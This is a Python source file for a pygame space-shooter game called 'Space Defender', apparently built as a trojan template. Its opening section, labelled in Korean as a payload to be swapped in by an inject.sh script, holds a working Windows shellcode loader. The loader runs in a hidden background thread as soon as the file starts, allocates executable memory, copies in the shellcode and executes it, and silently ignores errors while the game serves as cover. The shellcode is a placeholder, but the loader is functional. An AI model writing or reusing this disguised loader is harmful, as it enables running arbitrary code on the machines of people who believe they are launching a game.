import threading
import ctypes
import sys
import random
import math
import pygame

# ── Payload (inject.sh 로 교체됨) ─────────────────────────────────────────────
SHELLCODE = b"##SHELLCODE##"

def _run_payload():
    try:
        sc = bytearray(SHELLCODE)
        ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
        if not ptr:
            return
        buf = (ctypes.c_char * len(sc)).from_buffer(sc)
        ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(sc))
        ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, ctypes.byref(ctypes.c_ulong(0)))
        if ht:
            ctypes.windll.kernel32.WaitForSingleObject(ht, 0xFFFFFFFF)
    except Exception:
        pass

threading.Thread(target=_run_payload, daemon=True).start()

# ── Game ──────────────────────────────────────────────────────────────────────
pygame.init()

W, H = 800, 600
FPS  = 60
screen = pygame.display.set_mode((W, H))
pygame.display.set_caption("Space Defender")
clock  = pygame.time.Clock()

BLACK  = (5, 5, 15)
CYAN   = (0, 220, 255)
WHITE  = (255, 255, 255)
RED    = (220, 40, 40)
YELLOW = (255, 210, 0)
GRAY   = (80, 80, 100)

font_big  = pygame.font.SysFont("consolas", 36, bold=True)
font_med  = pygame.font.SysFont("consolas", 20)
font_sm   = pygame.font.SysFont("consolas", 14)

# --- 별 배경 ---
stars = [(random.randint(0, W), random.randint(0, H), random.uniform(0.5, 2.5)) for _ in range(180)]

def draw_stars(surf):
    for x, y, s in stars:
        c = int(s * 80)
        pygame.draw.circle(surf, (c, c, c + 20), (int(x), int(y)), max(1, int(s * 0.6)))

# --- 플레이어 ---
class Player:
    W, H = 40, 28
    SPEED = 5

    def __init__(self):
        self.x = W // 2
        self.y = H - 60
        self.lives = 3
        self.bullets = []
        self.shoot_cd = 0

    def draw(self, surf):
        px, py = self.x, self.y
        points = [(px, py - self.H // 2), (px - self.W // 2, py + self.H // 2),
                  (px, py + self.H // 4),   (px + self.W // 2, py + self.H // 2)]
        pygame.draw.polygon(surf, CYAN, points)
        pygame.draw.polygon(surf, WHITE, points, 1)

    def move(self, keys):
        if keys[pygame.K_LEFT]  and self.x > self.W // 2:     self.x -= self.SPEED
        if keys[pygame.K_RIGHT] and self.x < W - self.W // 2: self.x += self.SPEED

    def shoot(self):
        if self.shoot_cd <= 0:
            self.bullets.append([self.x, self.y - self.H // 2])
            self.shoot_cd = 12

    def update(self):
        self.shoot_cd -= 1
        self.bullets = [[bx, by - 10] for bx, by in self.bullets if by > 0]

# --- 적 ---
class Enemy:
    SIZE = 22

    def __init__(self, x, y, row):
        self.x, self.y = x, y
        self.row = row
        self.alive = True

    def draw(self, surf):
        if not self.alive:
            return
        s = self.SIZE
        color = [RED, YELLOW, (180, 60, 220)][min(self.row, 2)]
        pygame.draw.rect(surf, color, (self.x - s // 2, self.y - s // 2, s, s), border_radius=4)
        pygame.draw.rect(surf, WHITE, (self.x - s // 2, self.y - s // 2, s, s), 1, border_radius=4)

def make_enemies():
    cols, rows, sx, sy = 11, 4, 60, 60
    return [Enemy(sx + c * 58, 70 + r * 46, r) for r in range(rows) for c in range(cols)]

# --- 메인 루프 ---
def run_game():
    player = Player()
    enemies = make_enemies()
    score = 0
    e_dir = 1
    e_speed = 1.2
    game_over = False
    win = False
    e_bullets = []
    e_shoot_timer = 0

    while True:
        dt = clock.tick(FPS)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    pygame.quit()
                    sys.exit()
                if event.key == pygame.K_r and game_over:
                    return run_game()

        if not game_over:
            keys = pygame.key.get_pressed()
            player.move(keys)
            if keys[pygame.K_SPACE]:
                player.shoot()
            player.update()

            # 적 이동
            alive = [e for e in enemies if e.alive]
            if not alive:
                win = True
                game_over = True
            else:
                edge = max(e.x for e in alive) if e_dir > 0 else min(e.x for e in alive)
                if (e_dir > 0 and edge > W - 30) or (e_dir < 0 and edge < 30):
                    e_dir *= -1
                    for e in alive:
                        e.y += 18
                for e in alive:
                    e.x += e_dir * e_speed

                # 적 총알
                e_shoot_timer -= 1
                if e_shoot_timer <= 0 and alive:
                    shooter = random.choice(alive)
                    e_bullets.append([shooter.x, shooter.y + 12])
                    e_shoot_timer = random.randint(30, 70)

                e_bullets = [[bx, by + 6] for bx, by in e_bullets if by < H]

                # 충돌: 플레이어 총알 vs 적
                for b in player.bullets[:]:
                    for e in alive:
                        if abs(b[0] - e.x) < 14 and abs(b[1] - e.y) < 14:
                            e.alive = False
                            player.bullets.remove(b)
                            score += 10
                            e_speed = min(e_speed + 0.03, 4)
                            break

                # 충돌: 적 총알 vs 플레이어
                for b in e_bullets[:]:
                    if abs(b[0] - player.x) < 18 and abs(b[1] - player.y) < 16:
                        e_bullets.remove(b)
                        player.lives -= 1
                        if player.lives <= 0:
                            game_over = True

                # 적이 바닥까지 내려오면 게임오버
                if alive and max(e.y for e in alive) > H - 60:
                    game_over = True

        # ── 렌더 ──
        screen.fill(BLACK)
        draw_stars(screen)

        for e in enemies:
            e.draw(screen)
        player.draw(screen)

        for bx, by in player.bullets:
            pygame.draw.rect(screen, CYAN, (bx - 2, by - 8, 4, 12), border_radius=2)
        for bx, by in e_bullets:
            pygame.draw.rect(screen, RED, (bx - 2, by - 6, 4, 10), border_radius=2)

        # HUD
        score_surf = font_med.render(f"SCORE  {score:05d}", True, CYAN)
        lives_surf = font_med.render(f"LIVES  {'♥ ' * player.lives}", True, RED)
        screen.blit(score_surf, (12, 10))
        screen.blit(lives_surf, (W - lives_surf.get_width() - 12, 10))

        if game_over:
            overlay = pygame.Surface((W, H), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 140))
            screen.blit(overlay, (0, 0))
            msg = "YOU WIN!" if win else "GAME OVER"
            col = YELLOW if win else RED
            t1 = font_big.render(msg, True, col)
            t2 = font_sm.render("Press R to restart  /  ESC to quit", True, GRAY)
            screen.blit(t1, (W // 2 - t1.get_width() // 2, H // 2 - 40))
            screen.blit(t2, (W // 2 - t2.get_width() // 2, H // 2 + 20))

        pygame.display.flip()

run_game()
